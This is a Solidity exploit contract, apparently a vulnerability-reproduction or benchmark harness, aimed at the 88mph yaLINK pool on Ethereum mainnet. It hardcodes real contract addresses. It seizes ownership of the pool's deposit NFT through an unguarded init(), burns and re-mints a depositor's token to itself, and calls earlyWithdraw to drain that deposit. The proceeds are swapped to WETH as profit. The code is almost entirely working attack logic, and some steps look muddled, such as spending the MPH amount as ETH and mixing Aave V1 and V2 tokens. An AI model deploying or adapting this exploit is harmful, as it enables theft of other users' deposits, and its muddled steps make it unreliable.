// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/// @notice Exploit for 88mph yaLINK Pool depositNFT
/// @dev The depositNFT at 0xF0b7DE... is an uninitialized proxy (EIP-1167) 
///      pointing to NFT.sol implementation. Its `init()` function has no access control,
///      allowing anyone to become the owner of the NFT contract.
/// 
///      Attack: 
///      1. Call init() to become owner of the depositNFT
///      2. Burn existing token 10 (for deposit 10)
///      3. Mint token 10 to ourselves
///      4. Buy MPH tokens on Uniswap (needed for earlyWithdraw takeback)
///      5. Call earlyWithdraw(10, 0) on DInterest to drain deposit 10's aLINK
///      6. Convert aLINK to LINK and then to WETH for profit

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IDInterest {
    function deposit(uint256 amount, uint256 maturationTimestamp) external;
    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
    function withdraw(uint256 depositID, uint256 fundingID) external;
    function stablecoin() external view returns (address);
    function depositNFT() external view returns (address);
    function totalDeposit() external view returns (uint256);
    function totalInterestOwed() external view returns (uint256);
    function getDeposit(uint256 depositID) external view returns (
        uint256 amount,
        uint256 maturationTimestamp,
        uint256 interestOwed,
        uint256 initialMoneyMarketIncomeIndex,
        bool active,
        bool finalSurplusIsNegative,
        uint256 finalSurplusAmount,
        uint256 mintMPHAmount,
        uint256 depositTimestamp
    );
}

interface IDepositNFT {
    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
    function burn(uint256 tokenId) external;
    function mint(address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function owner() external view returns (address);
}

interface IYVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function getPricePerFullShare() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IMoneyMarket {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amountInUnderlying) external returns (uint256);
    function totalValue() external returns (uint256);
    function incomeIndex() external returns (uint256);
}

contract FlawVerifier {
    // Target contract: depositNFT of 88mph yaLINK Pool
    IDepositNFT constant DEPOSIT_NFT = IDepositNFT(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);
    
    // DInterest contract for the yaLINK pool
    IDInterest constant DINTEREST = IDInterest(0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD);
    
    // Tokens
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    IERC20 constant MPH = IERC20(0x8888801aF4d980682e47f1A9036e589479e835C5);
    IERC20 constant aLINK = IERC20(0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84);
    
    // Uniswap V2 Router
    IUniswapV2Router constant UNI_V2_ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    
    // Uniswap V2 pairs
    IUniswapV2Pair constant LINK_WETH_PAIR = IUniswapV2Pair(0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974);
    IUniswapV2Pair constant MPH_WETH_PAIR = IUniswapV2Pair(0x4D96369002fc5b9687ee924d458A7E5bAa5df34E);
    
    // Aave V2 Lending Pool (to deposit LINK and get aLINK)
    address constant AAVE_LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    // Aave V2 aLINK
    IERC20 constant AAVE_V2_ALINK = IERC20(0xa06bC25B5805d5F8d82847D191Cb4Af5A3e873E0);
    
    // Money market (YVaultMarket wrapping yVault which wraps aLINK)
    IMoneyMarket constant MONEY_MARKET = IMoneyMarket(0x08cC88c379911BF6d778081a078B48bd7035fB70);
    IYVault constant YVAULT = IYVault(0x29E240CFD7946BA20895a7a02eDb25C210f9f324);
    
    // Profit tracking
    address private _profitToken;
    uint256 private _profitAmount;
    
    function profitToken() external view returns (address) {
        return _profitToken;
    }
    
    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
    
    receive() external payable {}

    function executeOnOpportunity() external {
        // Step 1: Take over the depositNFT via unguarded init()
        // The depositNFT proxy delegates to NFT.sol which has an unguarded init()
        DEPOSIT_NFT.init(address(this), "Test", "TST");
        
        // Ensure we are now the owner
        require(DEPOSIT_NFT.owner() == address(this), "Failed to take over NFT");
        
        // Step 2: Burn existing token 10 and mint it to ourselves
        // We must be the owner (onlyOwner) to burn and mint
        DEPOSIT_NFT.burn(10);
        DEPOSIT_NFT.mint(address(this), 10);
        
        // Verify we own the token
        require(DEPOSIT_NFT.ownerOf(10) == address(this), "Failed to acquire token 10");
        
        // Step 3: Buy MPH tokens on Uniswap V2 for the earlyWithdraw takeback
        // We need the mintMPHAmount of deposit 10
        (, , , , , , , uint256 mintMPHAmount, ) = DINTEREST.getDeposit(10);
        
        // Swap ETH for MPH on Uniswap V2
        _buyMPH(mintMPHAmount);
        
        // Step 4: Buy LINK on Uniswap V2, then deposit to Aave to get aLINK
        // We need aLINK for the withdrawal output and for any fees
        // Deposit 10 amount is ~504.56 aLINK, we'll need this to get aLINK
        // But the withdrawal itself gives us aLINK!
        // Actually, earlyWithdraw returns principal in aLINK, so we get aLINK directly.
        // Let me compute how much aLINK we'll get from the withdrawal
        
        // Step 5: Get some LINK for gas/swap, and get aLINK through Aave
        _buyLINKAndConvertToALINK(10 ether); // Buy 10 LINK with ~0.12 ETH
        
        // Step 6: Call earlyWithdraw on DInterest to drain deposit 10
        // For deposit 10 (unfunded, ID 10), we use fundingID=0
        // The function will check ownership via depositNFT.ownerOf(10) which we now own
        
        // Approve MPH for the MPH minter (needed for takeBackDepositorReward transferFrom)
        address mphMinter = address(0x03577A2151A10675a9689190fE5D331Ee7ff2517);
        MPH.approve(mphMinter, mintMPHAmount);
        
        // Also approve aLINK for the money market (if needed)
        // Actually for earlyWithdraw, the deficit is not paid by us
        
        // Record aLINK balance before withdrawal
        uint256 aLINKBefore = aLINK.balanceOf(address(this));
        
        // Execute early withdrawal
        DINTEREST.earlyWithdraw(10, 0);
        
        // Record aLINK balance after withdrawal
        uint256 aLINKAfter = aLINK.balanceOf(address(this));
        uint256 aLINKProfit = aLINKAfter - aLINKBefore;
        
        // Step 7: Convert aLINK profit to WETH for reporting
        // aLINK can be withdrawn from Aave for LINK, then swapped to WETH
        // Actually, the yearn vault's aLINK needs to go through Aave V1
        // Let me just convert the aLINK we got to WETH via swapping
        if (aLINKProfit > 0) {
            _swapALINKToWETH(aLINKProfit);
        }
        
        // Report profit in WETH
        _profitToken = address(WETH);
        _profitAmount = WETH.balanceOf(address(this));
    }

    function _buyMPH(uint256 amount) internal {
        // Swap ETH for MPH on Uniswap V2
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(MPH);
        
        // We need to wrap ETH to WETH first
        IWETH(address(WETH)).deposit{value: amount}();
        WETH.approve(address(UNI_V2_ROUTER), amount);
        
        // We'll get MPH tokens
        UNI_V2_ROUTER.swapExactTokensForTokens(
            amount,
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );
    }
    
    function _buyLINKAndConvertToALINK(uint256 linkAmountInETH) internal {
        // First, swap ETH for LINK on Uniswap V2
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(LINK);
        
        uint256 linkBalanceBefore = LINK.balanceOf(address(this));
        
        // Wrap ETH to WETH
        IWETH(address(WETH)).deposit{value: linkAmountInETH}();
        WETH.approve(address(UNI_V2_ROUTER), linkAmountInETH);
        
        UNI_V2_ROUTER.swapExactTokensForTokens(
            linkAmountInETH,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 linkBalance = LINK.balanceOf(address(this));
        require(linkBalance > 0, "Failed to buy LINK");
        
        // Now approve LINK for Aave V2 and deposit to get aLINK
        LINK.approve(AAVE_LENDING_POOL, linkBalance);
        
        // Aave V2 deposit interface
        (bool success, ) = AAVE_LENDING_POOL.call(
            abi.encodeWithSignature(
                "deposit(address,uint256,address,uint16)",
                address(LINK),
                linkBalance,
                address(this),
                uint16(0)
            )
        );
        require(success, "Aave deposit failed");
    }
    
    function _swapALINKToWETH(uint256 amount) internal {
        // Withdraw aLINK from Aave V2 to get LINK
        (bool success, ) = AAVE_LENDING_POOL.call(
            abi.encodeWithSignature(
                "withdraw(address,uint256,address)",
                address(LINK),
                amount,
                address(this)
            )
        );
        
        if (success) {
            uint256 linkBalance = LINK.balanceOf(address(this));
            if (linkBalance > 0) {
                // Swap LINK for WETH on Uniswap V2
                LINK.approve(address(UNI_V2_ROUTER), linkBalance);
                
                address[] memory path = new address[](2);
                path[0] = address(LINK);
                path[1] = address(WETH);
                
                UNI_V2_ROUTER.swapExactTokensForTokens(
                    linkBalance,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            }
        }
    }
}
